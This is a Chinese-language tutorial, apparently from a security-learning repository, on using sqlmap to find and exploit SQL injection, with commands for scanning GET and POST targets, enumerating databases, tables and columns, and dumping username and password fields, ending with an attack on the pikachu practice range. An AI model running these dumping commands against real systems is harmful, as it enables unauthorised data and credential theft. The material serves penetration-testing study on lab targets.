<h1>一、Sqlmap是什么</h1>

SQLmap是一款由Python语言编写的开源SQL注入检测与利用工具，它具备强大的自动化功能，能够自动检测和利用Web应用程序中的SQL注入漏洞。它支持多种数据库管理系统，包括MySQL、Oracle、PostgreSQL、Microsoft SQL Server等，并提供了丰富的特性和选项，如指纹识别、数据库枚举、数据提取、文件访问、命令执行等。kali自带该工具，路径为 /usr/share/sqlmap </br>

<h1>二、Sqlmap使用方法</h1>

<h2>1.指定要扫描的目标(GET)</h2>

-u (url)参数，指定需要检测的url，单/双引号包裹。中间如果有提示，就输入y。 </br>
提示：SQLmap不能直接「扫描」网站漏洞，先用其他扫描工具扫出注入点，再用SQLmap验证并「利用」注入点。 </br>
举例：

```
# 注意，这里是适用于get请求的接口扫描
sqlmap -u 'http://192.168.31.180/sqli-labs-master/Less-1/?id=1'
```

扫描结果为

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/4a45baf9-166f-4093-96a8-ebbcdddf2fa3)

<h2>2.多目标扫描(GET)</h2>

准备一个【文本文件】，写上需要检测的多个url，一行一个。 </br>
-m (multi)指定文件，可以「批量扫描」文件中的url。 </br>

逐个扫描url，需要确认就按y。

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/98c72d58-1c82-4f72-b7f3-b3e6ac07a174)

扫描完一个，就会提示存在的注入点。

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/83babbab-9656-474b-9e79-9a7b5228d6a6)

然后再按y扫描下一个url。

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/94f61f22-6a1f-43d9-bbc6-a7e72ef7c187)

<h2>3.指定要扫描的目标(POST)</h2>

检测「post请求」的注入点，使用BP等工具「抓包」，将http请求内容保存到txt文件中。

-r 指定需要检测的文件，SQLmap会通过post请求方式检测目标。

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/b1afbdb0-fedb-4f70-8739-54489501217d)

<h2>4.指定要扫描的数据库/表/字段</h2>

-D (Database)指定目标「数据库」，单/双引号包裹，常配合其他参数使用。 </br>

-T (Table)指定目标「表」，单/双引号包裹，常配合其他参数使用。 </br>

-C (Column)指定目标「字段」，单/双引号包裹，常配合其他参数使用。 </br>

一般会与其他参数结合进行使用，逐级进行数据获取，比如：

```
#1.获取所有库名
python sqlmap.py -r post_payload.txt --dbs

#2.进入指定数据库，获取库内所有表名
python sqlmap.py -r post_payload.txt -D pikachu --tables

#3.进入指定数据库的数据表，获取表内所有字段名
python sqlmap.py -r post_payload.txt -D pikachu -T users --colums
```

<h2>5.cookie注入</h2>

--cookie 指定cookie的值，单/双引号包裹。

```
sqlmap -u "http://xx?id=x" --cookie 'cookie'
```

<h1>三、脱库</h1>

-a (all)就是 all 的意思，获取所有能获取的内容，会消耗很长时间，不建议使用。

```
sqlmap -u "http://xx?id=x" -a
```

<h2>1.获取数据库</h2>

(1)获取数据库版本 </br>

```
sqlmap -u 'http://xx/?id=1' -b
```

(2)获取当前使用的数据库 </br>

```
sqlmap -u 'http://xx/?id=1' --current-db
```

(3)获取所有数据库 </br>

```
sqlmap -u 'http://xx/?id=1' --dbs
```

<h2>2.获取数据表</h2>

(1)获取表，可以指定数据库 </br>

```
sqlmap -u 'http://xx/?id=1' -D 'security' --tables
```

(2)同时获取多个库的表名，库名用逗号分隔 </br>

```
sqlmap -u 'http://xx/?id=1' -D 'security,sys' --tables
```

(3)不指定数据库，默认获取数据库中所有的表 </br>

```
sqlmap -u 'http://xx/?id=1' --tables
```

<h2>3.获取字段</h2>

(1)获取字段，可以指定库和表</br>

```
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --columns
```

(2)不指定表名，默认获取当前数据库中所有表的字段</br>

```
sqlmap -u 'http://xx/?id=1' --columns
```

<h2>4.获取字段类型</h2>

--schema 获取字段类型，可以指定库或指定表。不指定则获取数据库中所有字段的类型。</br>

<h2>5.获取数据(脱库脱数据)</h2>

--dump 获取值，也就是表中的数据。可以指定具体的库、表、字段。

```
# 获取security数据库中users表的username和password字段，并将数据脱出数据库存放在攻击终端本地
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' -C 'username,password' --dump
```

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/5b3d1de9-82e2-4293-a22a-86a27bafeac4)

获取指定库中所有表的数据。

```
sqlmap -u 'http://xx/?id=1' -D 'security' --dump
```

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/5882be28-3928-4cbf-b891-370e0b700a56)

默认获取表中的所有数据，可以使用 --start --stop 指定开始和结束的行，只获取一部分数据。

```
sqlmap -u 'http://xx/?id=1' -D 'security' -T 'users' --start 1 --stop 5  --dump
```

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/cb8d424b-beb4-4e53-b935-823e31c1caa0)


<h1>四、实际案例--针对pikachu靶场sql注入漏洞使用sqlmap进行攻击</h2>

抓取存在POST类型请求的具有sql注入漏洞的请求包

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/8bf89090-2d19-4dd1-9dab-1364fbee8e6c)

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/d7a31391-a149-41b7-99a8-c6b0f47f850a)

将请求包存储为文本类型的文件post_payload.txt,并使用以下的命令进行扫描，扫描内容为查看所有数据库(--dbs)

```
 python sqlmap.py -r post_payload.txt --dbs
```

![image](https://github.com/WarlockW/Security-Learning-Daily/assets/64346345/abd9b48c-49e6-487d-8cf5-15088135593b)

